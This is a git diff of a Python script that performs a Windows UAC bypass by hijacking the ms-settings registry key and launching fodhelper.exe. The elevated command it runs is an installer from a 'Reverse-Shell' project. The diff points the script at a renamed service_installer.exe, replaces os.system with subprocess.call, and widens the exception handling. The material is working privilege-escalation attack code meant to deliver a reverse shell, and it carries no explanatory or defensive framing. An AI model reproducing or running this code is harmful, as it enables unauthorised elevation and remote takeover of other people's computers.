@@ -1,9 +1,10 @@
 import os
+import subprocess
 import sys
 import ctypes
 import winreg
 
-CMD = r"C:\Users\User\Desktop\Reverse-Shell\dist\installer.exe"
+CMD = r"C:\Users\User\Desktop\Reverse-Shell\service_installer\dist\service_installer.exe"
 FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
 PYTHON_CMD = "python"
 REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
@@ -57,7 +58,7 @@ def bypass_uac(cmd):
         raise
 
 
-def execute():
+def main():
     if not is_running_as_admin():
         print('[!] The script is NOT running with administrative privileges')
         print('[+] Trying to bypass the UAC')
@@ -66,13 +67,14 @@ def execute():
             current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
             cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
             bypass_uac(cmd)
-            os.system(FOD_HELPER)
+            subprocess.call(FOD_HELPER, shell=True)
             sys.exit(0)
-        except WindowsError:
+        except Exception as e:
+            print(e)
             sys.exit(1)
     else:
         print('[+] The script is running with administrative privileges!')
 
 
 if __name__ == '__main__':
-    execute()
+    main()
